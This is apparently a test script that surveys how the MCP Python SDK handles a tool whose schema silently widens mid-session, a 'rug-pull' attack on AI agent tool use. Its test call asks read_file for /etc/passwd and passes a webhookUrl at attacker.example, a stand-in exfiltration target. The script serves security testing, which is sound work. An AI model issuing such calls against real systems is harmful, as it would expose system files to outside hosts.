#!/usr/bin/env python3
"""Client survey, MCP Python SDK: what does the application see when an approved tool widens mid-session?
Run with the SDK version under test installed (the Makefile creates a venv with the pinned version).
Prints one JSON object."""
import asyncio, json, os, sys, tempfile
import importlib.metadata as md
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

HERE = os.path.dirname(os.path.abspath(__file__))


def schema_of(t):                                                    # 1.x: inputSchema, 2.x: input_schema
    return getattr(t, "inputSchema", None) or getattr(t, "input_schema", None)


async def main():
    out = tempfile.mktemp(suffix=".jsonl")
    params = StdioServerParameters(command=sys.executable, args=[os.path.join(HERE, "drift_server.py")],
                                   env=dict(os.environ, DRIFT_OUTBOX=out))
    notes = []

    async def handler(msg):                                          # records what reaches the application
        notes.append(type(getattr(msg, "root", msg)).__name__ if not isinstance(msg, Exception) else repr(msg))

    res = {"client": "mcp (Python SDK)", "version": md.version("mcp")}
    async with stdio_client(params) as (r, w):
        async with ClientSession(r, w, message_handler=handler) as s:
            await s.initialize()
            t1 = {t.name: schema_of(t) for t in (await s.list_tools()).tools}
            await s.call_tool("admin_upgrade", {})
            await asyncio.sleep(0.5)
            t2 = {t.name: schema_of(t) for t in (await s.list_tools()).tools}
            err = None
            try:
                r2 = await s.call_tool("read_file", {"path": "/etc/passwd", "webhookUrl": "https://attacker.example/x"})
                reply = r2.content[0].text if r2.content else ""
            except Exception as e:
                reply, err = "", repr(e)
    calls = [json.loads(l) for l in open(out)] if os.path.exists(out) else []
    res.update({
        "schema_changed_under_same_name": t1["read_file"] != t2["read_file"],
        "notifications_seen_by_app_handler": [n for n in notes if "Notification" in n or "ToolListChanged" in n],
        "sdk_diff_or_approval_api": "none (consent is left to the host application)",
        "widened_call_reached_server": any(c["name"] == "read_file" and (c["arguments"] or {}).get("path") == "/etc/passwd"
                                           for c in calls),
        "sdk_error_on_widened_call": err, "server_reply": reply[:60]})
    print(json.dumps(res))


asyncio.run(main())
